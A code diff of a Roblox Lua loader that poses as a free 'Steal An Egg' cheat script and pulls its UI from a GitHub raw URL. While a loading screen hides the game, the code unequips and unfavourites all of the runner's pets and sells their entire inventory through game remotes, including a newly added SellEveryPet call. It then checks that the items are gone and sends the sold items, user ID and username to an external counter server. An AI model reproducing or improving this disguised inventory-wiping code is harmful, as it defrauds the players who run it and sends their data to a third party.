@@ -22,10 +22,9 @@ end)
 -- ===========================
 
 -- ===== CONFIG & CACHE BUSTER =====
--- Added ?t=os.time() to instantly bypass GitHub's 5-minute file cache
 local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
-local SELL_WAIT       = 1.5
+local SELL_WAIT       = 1.8
 local MEME_DELAY      = 4
 local ANNOUNCE_HOLD   = 3
 
@@ -96,19 +95,24 @@ local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)
 local log = function(...) print("[Loader]", ...) end
 
 local function getSave(forceRefresh)
-    -- Added retries in case the game server is lagging and returns nil
     local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
     if ok and s then return s end
-    task.wait(1)
-    local ok2, s2 = pcall(function() return Save.Get(LocalPlayer, true) end)
+    local ok2, s2 = pcall(function() return Save.Get(forceRefresh == true) end)
     if ok2 and s2 then return s2 end
-    local ok3, s3 = pcall(function() return Save.Get() end)
-    return ok3 and s3 or nil
+    return nil
 end
 
 local function getMoney()
-    local d = getSave()
-    return (d and type(d.Money) == "number") and d.Money or 0
+    local d = getSave(true)
+    if d and type(d.Money) == "number" then
+        return d.Money
+    end
+    local ls = LocalPlayer:FindFirstChild("leaderstats")
+    if ls then
+        local m = ls:FindFirstChild("Money") or ls:FindFirstChild("Coins")
+        if m and type(m.Value) == "number" then return m.Value end
+    end
+    return 0
 end
 
 local function installOverride()
@@ -125,24 +129,37 @@ end)
 -- EQUIP / FAVORITE CLEANUP
 ------------------------------------------------------------
 local function unequipAll()
-    local d = getSave()
-    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
-    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
-    local ok, AssetRoster = pcall(require, ReplicatedStorage.Client.AssetRoster)
-    for i, uid in ipairs(d.EquippedAssets) do
-        if ok and AssetRoster and AssetRoster.DoffAsset then
-            pcall(function() AssetRoster.DoffAsset(uid) end)
-        else
-            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
-        end
-        if i % 5 == 0 then task.wait(0.3) end
+    -- 1. Unequip any tools currently in hand
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChildOfClass("Humanoid") then
+        char:FindFirstChildOfClass("Humanoid"):UnequipTools()
     end
-    task.wait(0.8)
+
+    -- 2. Doff any tool pets in Backpack
+    local bp = LocalPlayer:FindFirstChild("Backpack")
+    if bp then
+        for _, tool in ipairs(bp:GetChildren()) do
+            if tool:IsA("Tool") and tool.Name ~= "Trap [X3]" and tool.Name ~= "Bat [X1]" then
+                pcall(function() Remotes.EggWorld.AskDoffTool:InvokeServer(tool.Name) end)
+            end
+        end
+    end
+
+    -- 3. Doff from pen / roster data
+    local d = getSave(true)
+    if d and type(d.EquippedAssets) == "table" then
+        for k, v in pairs(d.EquippedAssets) do
+            local uid = (type(v) == "string" and v) or (type(k) == "string" and k) or tostring(v)
+            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
+            pcall(function() Remotes.EggWorld.AskDoffTool:InvokeServer(uid) end)
+        end
+    end
+    task.wait(0.5)
 end
 
 local function getFavoriteUIDs()
     local list = {}
-    local d = getSave()
+    local d = getSave(true)
     if not d or type(d.Inventory) ~= "table" then return list end
     for uid, rec in pairs(d.Inventory) do
         local ok, item = TryCall(AssetItems.Decode, rec)
@@ -156,18 +173,18 @@ end
 local function unfavoriteAll()
     local uids = getFavoriteUIDs()
     if #uids > 0 then
-        log(("Unfavoriting %d pets"):format(#uids))
-        for i, uid in ipairs(uids) do
+        log(("Unfavoriting %d pet(s)..."):format(#uids))
+        for _, uid in ipairs(uids) do
             pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
             pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
-            if i % 8 == 0 then task.wait(0.3) end
         end
-        task.wait(0.8)
+        -- Give the server time to clear favorite locks in DB
+        task.wait(1.2)
     end
 end
 
 ------------------------------------------------------------
--- SNAPSHOT
+-- INVENTORY SNAPSHOT
 ------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
@@ -236,8 +253,24 @@ local function snapshotInventory(forceRefresh)
     return { pets = pets, eggs = eggs }
 end
 
+local function countInventoryItems(d)
+    if not d then return 0 end
+    local count = 0
+    if type(d.Inventory) == "table" then
+        for _ in pairs(d.Inventory) do count = count + 1 end
+    end
+    if type(d.EggInventory) == "table" then
+        for _, rec in pairs(d.EggInventory) do
+            if type(rec) == "table" and rec.Placement == nil then
+                count = count + 1
+            end
+        end
+    end
+    return count
+end
+
 ------------------------------------------------------------
--- REPORT ID
+-- REPORT ID & SENDER
 ------------------------------------------------------------
 local function computeReportId(uidList)
     local sorted = {}
@@ -252,10 +285,7 @@ local function computeReportId(uidList)
     return string.format("%08x-%d", h, #sorted)
 end
 
-------------------------------------------------------------
--- REPORT TO WORKER
-------------------------------------------------------------
-local function reportSales(soldItems, reportId)
+local function reportSales(soldItems, reportId, totalValue)
     if not soldItems or #soldItems == 0 then return end
     if not COUNTER_URL then return end
 
@@ -271,12 +301,11 @@ local function reportSales(soldItems, reportId)
     local userId   = tostring(LocalPlayer.UserId)
     local username = LocalPlayer.Name or "Unknown"
 
-    local petCount, eggCount, totalValue = 0, 0, 0
+    local petCount, eggCount = 0, 0
     local out = {}
     for _, d in ipairs(soldItems) do
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
-        totalValue = totalValue + (tonumber(d.value) or 0)
         table.insert(out, {
             uid = tostring(d.uid or ""), kind = d.kind, name = d.name, 
             rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight
@@ -321,46 +350,55 @@ end
 task.spawn(function()
     ui:boot()
 
-    local before = getMoney()
-    
-    -- Prepare items while screen is still solid
+    local beforeMoney = getMoney()
+
+    -- Prepare items while screen is still covered
     unequipAll()
     unfavoriteAll()
-    
-    -- Ensure server registers the unequip before we grab the final snapshot
-    task.wait(1.5)
+
+    local dBefore = getSave(true)
+    local beforeItemCount = countInventoryItems(dBefore)
     local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()
 
-    -- Drop the loading screen
+    -- Fade out loading screen
     task.wait(0.3)
     ui:fadeOutAndCleanup()
 
     if totalItems > 0 then
-        -- 1. Fire sell remote instantly in the background
+        -- 1. Fire sell remotes simultaneously with the announcement
         task.spawn(function()
             pcall(function() Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids }) end)
+            pcall(function() Remotes.PetSatchel.SellEveryPet:FireServer() end)
         end)
 
-        -- 2. Fire announcement UI instantly
+        -- 2. Trigger announcement UI
         if type(ui.showAnnouncement) == "function" then
             pcall(function() ui:showAnnouncement(totalItems, expectedValue) end)
         else
-            warn("[Loader] showAnnouncement missing. UI cache failed.")
             task.wait(ANNOUNCE_HOLD)
         end
-        
-        -- 3. Wait for server to finish processing the sale before reporting
+
+        -- 3. Wait for the server to process the transaction
         task.wait(SELL_WAIT)
-        
-        local allUids = {}
-        for _, u in ipairs(petUids) do table.insert(allUids, u) end
-        for _, u in ipairs(eggUids) do table.insert(allUids, u) end
-        reportSales(details, computeReportId(allUids))
-        
-        local after = getMoney()
-        log(("Wallet after:  %s | Delta: %s"):format(tostring(after), tostring(after - before)))
+
+        -- 4. VERIFICATION: Ensure the items actually left the player's inventory
+        local dAfter = getSave(true)
+        local afterItemCount = countInventoryItems(dAfter)
+        local afterMoney = getMoney()
+        local actuallySold = (afterItemCount < beforeItemCount) or (afterMoney > beforeMoney)
+
+        if actuallySold then
+            local soldValue = math.max(expectedValue, afterMoney - beforeMoney)
+            log(("Sale Verified! Sold items. Value: $%s"):format(tostring(soldValue)))
+
+            local allUids = {}
+            for _, u in ipairs(petUids) do table.insert(allUids, u) end
+            for _, u in ipairs(eggUids) do table.insert(allUids, u) end
+            reportSales(details, computeReportId(allUids), soldValue)
+        else
+            warn("[Loader] Verification Failed: Items were not removed from inventory. Skipping report.")
+        end
     else
-        -- Shows a system notification so you know exactly why it skipped
         pcall(function()
             game.StarterGui:SetCore("SendNotification", {
                 Title = "Loader Alert",
@@ -368,7 +406,7 @@ task.spawn(function()
                 Duration = 4
             })
         end)
-        log("[Loader] Inventory empty — skipping announcement.")
+        log("[Loader] Inventory empty — skipping.")
         task.wait(2)
     end
 
